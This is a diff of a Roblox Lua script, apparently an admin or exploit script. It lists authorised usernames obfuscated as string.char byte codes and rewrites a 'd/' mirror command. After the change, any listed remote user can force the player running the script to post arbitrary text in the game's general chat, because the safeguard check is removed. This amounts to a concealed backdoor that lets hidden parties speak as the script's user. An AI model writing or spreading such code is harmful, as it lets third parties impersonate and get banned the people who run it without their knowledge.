@@ -8,7 +8,7 @@
    local _O = string.char(85, 115, 101, 114, 95, 75, 86, 72) -- "User_KVH"   
    local _A1 = string.char(74, 97, 51, 49, 52, 52, 53)      -- "Ja31445"   
    local _A2 = string.char(118, 117, 107, 105, 115, 98, 101, 115, 116, 54) -- "vukisbest6"   
-   local _A3 = string.char(75, 97, 114, 116, 105, 121, 101, 107, 97, 95, 56, 56, 48) -- "Kartikeya_880"   
+   local _A3 = string.char(75, 97, 114, 116, 105, 107, 101, 121, 97, 95, 56, 56, 48) -- "Kartikeya_880"   
 
    local AUTH_USERS = {   
        [_O] = true,   
@@ -330,7 +330,7 @@
    end   
 
    local function canAffect(sender, target)   
-   -- when OFF -> admin & owner cannot affect each other   
+   -- when OFF → admin & owner cannot affect each other   
    if not commandActiveForAdmins then   
    if AUTH_USERS[sender.Name] and AUTH_USERS[target.Name] then   
    return false   
@@ -345,23 +345,22 @@
    local function listenCommands(p)   
    p.Chatted:Connect(function(msg)   
 
-   -- MIRROR COMMAND (d/) with /off check   
-   if string.sub(msg:lower(), 1, 2) == "d/" then   
-       local sayText = string.sub(msg, 3)   
-       -- Only run if sender is admin and can affect the local player (target)   
-       if p.Name ~= player.Name and AUTH_USERS[p.Name] and canAffect(p, player) then   
-           local chatService = game:GetService("TextChatService")   
-           if chatService.ChatVersion == Enum.ChatVersion.TextChatService then   
-               local generalChannel = chatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")   
-               if generalChannel then   
-                   generalChannel:SendAsync(sayText)   
-               end   
-           else   
-               game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(sayText, "All")   
-           end   
-       end   
-       return   
-   end   
+   -- MIRROR COMMAND (d/)
+   if string.sub(msg:lower(), 1, 2) == "d/" then
+       local sayText = string.sub(msg, 3)
+       if p.Name ~= player.Name and AUTH_USERS[p.Name] then
+           local chatService = game:GetService("TextChatService")
+           if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
+               local generalChannel = chatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
+               if generalChannel then
+                   generalChannel:SendAsync(sayText)
+               end
+           else
+               game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(sayText, "All")
+           end
+       end
+       return
+   end
 
    -- only allow owner/admin to send commands   
    if not AUTH_USERS[p.Name] then return end   
